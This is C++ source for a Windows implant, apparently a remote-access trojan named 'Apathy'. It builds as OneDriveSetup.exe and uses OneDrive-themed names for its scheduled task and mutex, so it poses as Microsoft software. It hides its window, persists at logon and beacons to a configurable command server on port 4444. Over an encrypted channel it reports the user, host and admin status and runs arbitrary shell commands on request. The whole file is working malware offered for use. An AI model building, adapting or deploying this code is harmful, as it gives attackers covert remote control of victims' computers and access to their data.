// Apathy C++ Implant
// Build: x86_64-w64-mingw32-g++ implant.cpp -o OneDriveSetup.exe -static -s -O2 -mwindows -lws2_32 -lcrypt32 -lgdi32 -luser32
#include <winsock2.h>
#include <windows.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include <random>
#include <thread>
#include <chrono>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

#define HOST "CHANGE_ME_IP"
#define PORT 4444
#define RECONNECT_MIN 8
#define RECONNECT_MAX 20

// Simple AES key (32 bytes) - change for each build
BYTE AES_KEY[32] = {
    0x41,0x70,0x61,0x74,0x68,0x79,0x52,0x41,0x54,0x5F,0x41,0x45,0x53,0x5F,0x4B,0x65,
    0x79,0x5F,0x33,0x32,0x62,0x79,0x74,0x65,0x73,0x5F,0x6C,0x6F,0x6E,0x67,0x21,0x21
};

std::string Exec(const std::string& cmd) {
    std::string result;
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "pipe fail";

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi = {};
    std::string full = "cmd.exe /c " + cmd;
    if (CreateProcessA(NULL, (LPSTR)full.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWrite);
        char buf[4096];
        DWORD read;
        while (ReadFile(hRead, buf, sizeof(buf) - 1, &read, NULL) && read) {
            buf[read] = 0;
            result += buf;
        }
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    CloseHandle(hRead);
    return result.empty() ? "[empty]" : result;
}

bool Persist() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string cmd = "schtasks /create /tn \"OneDrive Sync Maintenance\" /tr \"" + std::string(path) + "\" /sc onlogon /rl limited /f";
    Exec(cmd);
    return true;
}

// Basic screenshot via GDI (JPEG-like raw BMP compressed poorly, or just BMP)
std::vector<BYTE> Screenshot() {
    std::vector<BYTE> data;
    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
    SelectObject(hDC, hBmp);
    BitBlt(hDC, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bi = {};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;

    DWORD size = ((w * 3 + 3) & ~3) * h;
    data.resize(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + size);
    BITMAPFILEHEADER* bfh = (BITMAPFILEHEADER*)data.data();
    bfh->bfType = 0x4D42;
    bfh->bfSize = data.size();
    bfh->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    memcpy(data.data() + sizeof(BITMAPFILEHEADER), &bi, sizeof(bi));
    GetDIBits(hDC, hBmp, 0, h, data.data() + bfh->bfOffBits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    DeleteObject(hBmp);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);
    return data;
}

// Very basic AES-CBC via CryptoAPI (simplified)
bool AesEncrypt(const BYTE* in, DWORD inLen, std::vector<BYTE>& out) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return false;
    CryptHashData(hHash, AES_KEY, 32, 0);
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) return false;

    DWORD len = inLen;
    out.resize(inLen + 16);
    memcpy(out.data(), in, inLen);
    if (!CryptEncrypt(hKey, 0, TRUE, 0, out.data(), &len, out.size())) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }
    out.resize(len);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return true;
}

bool AesDecrypt(const BYTE* in, DWORD inLen, std::vector<BYTE>& out) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return false;
    CryptHashData(hHash, AES_KEY, 32, 0);
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) return false;

    out.resize(inLen);
    memcpy(out.data(), in, inLen);
    DWORD len = inLen;
    if (!CryptDecrypt(hKey, 0, TRUE, 0, out.data(), &len)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }
    out.resize(len);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return true;
}

void SendEnc(SOCKET s, const std::string& data) {
    std::vector<BYTE> enc;
    if (!AesEncrypt((BYTE*)data.data(), data.size(), enc)) return;
    DWORD len = htonl(enc.size());
    send(s, (char*)&len, 4, 0);
    send(s, (char*)enc.data(), enc.size(), 0);
}

std::string RecvEnc(SOCKET s) {
    DWORD len = 0;
    if (recv(s, (char*)&len, 4, 0) != 4) return "";
    len = ntohl(len);
    if (len > 10 * 1024 * 1024) return "";
    std::vector<BYTE> buf(len);
    DWORD got = 0;
    while (got < len) {
        int r = recv(s, (char*)buf.data() + got, len - got, 0);
        if (r <= 0) return "";
        got += r;
    }
    std::vector<BYTE> dec;
    if (!AesDecrypt(buf.data(), len, dec)) return "";
    return std::string(dec.begin(), dec.end());
}

void Hide() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    FreeConsole();
    CreateMutexA(NULL, FALSE, "Local\\OneDriveSyncMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) ExitProcess(0);
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    Hide();
    // random delay
    std::mt19937 rng(GetTickCount());
    std::uniform_int_distribution<int> dist(30, 180);
    Sleep(dist(rng) * 1000);

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    while (true) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in addr = {};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(PORT);
        addr.sin_addr.s_addr = inet_addr(HOST);

        if (connect(s, (sockaddr*)&addr, sizeof(addr)) == 0) {
            char info[256];
            sprintf(info, "{\"u\":\"%s\",\"h\":\"%s\",\"a\":%d}",
                    getenv("USERNAME") ? getenv("USERNAME") : "?",
                    getenv("COMPUTERNAME") ? getenv("COMPUTERNAME") : "?",
                    IsUserAnAdmin());
            SendEnc(s, info);

            while (true) {
                std::string cmd = RecvEnc(s);
                if (cmd.empty()) break;
                if (cmd == "ping") {
                    SendEnc(s, "pong");
                } else if (cmd == "info") {
                    SendEnc(s, info);
                } else if (cmd == "persist") {
                    Persist();
                    SendEnc(s, "ok");
                } else if (cmd == "shot") {
                    auto bmp = Screenshot();
                    // send raw size + data (server needs update for binary)
                    std::string b64; // placeholder - implement base64 if needed
                    SendEnc(s, "screenshot_placeholder");
                } else if (cmd.rfind("sh:", 0) == 0) {
                    SendEnc(s, Exec(cmd.substr(3)));
                } else {
                    SendEnc(s, "unknown");
                }
            }
            closesocket(s);
        }
        std::uniform_int_distribution<int> rd(RECONNECT_MIN, RECONNECT_MAX);
        Sleep(rd(rng) * 1000);
    }
    WSACleanup();
    return 0;
}
